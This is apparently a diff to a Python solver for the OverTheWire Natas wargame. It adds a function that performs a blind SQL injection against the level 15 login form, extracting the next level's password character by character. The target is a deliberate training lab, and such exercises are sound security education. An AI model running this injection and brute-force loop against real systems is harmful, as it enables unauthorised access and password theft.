@@ -1,6 +1,6 @@
 import http.client
 import urllib.parse
-import re, base64, json
+import string, re, base64, json
 
 host = "natas.labs.overthewire.org"
 login = "natas"
@@ -20,16 +20,16 @@ def req(method, url, headers={}, body=""):
     
     return(conn.getresponse())
 
-def rex(method, url, regexp, headers={}, body=""):
-    print(" Request to web server: ", end="")
+def rex(method, url, regexp, headers={}, body="", log=True):
+    if log: print(" Request to web server: ", end="")
     res = req(method, url, headers, body)
     reg = None
     data = res.read().decode(errors="ignore")
     if res.status == 200:
-        print("OK")
+        if log: print("OK")
         reg = re.search(regexp, data)
     else:
-        print("Error ({})".format(res.status))
+        if log: print("Error ({})".format(res.status))
 
     return(res, reg)
 
@@ -294,6 +294,41 @@ def level14():
     else:
         print(" Password not found")        
 
+def level15():
+    b = "username=natas16\" and password like binary \""
+    print(" Blind SQL injection {}".format(b))
+    p = ""
+    c = True
+    s = string.ascii_letters + string.digits
+    print(" Bruteforce password: ", end="", flush=True)
+    while c:
+        for i in s:
+            res, reg = rex(
+                "POST",
+                "/index.php",
+                "This user exists",
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                body="{}{}{}%".format(b, p, i),
+                log=False,
+            )
+
+            if res.status != 200: return
+            if reg:
+                p += i
+                print(i, end="", flush=True)
+                break
+            else:
+                if i == s[-1]:
+                    c = False
+                    break
+
+    print()
+    if p != "":
+        if len(passwords) == level + 1: passwords.append(p)
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -302,7 +337,7 @@ levels = [
     level0, level0, level2, level2,
     level4, level5, level6, level7,
     level8, level9, level9, level11,
-    level12, level12, level14, levelN,
+    level12, level12, level14, level15,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
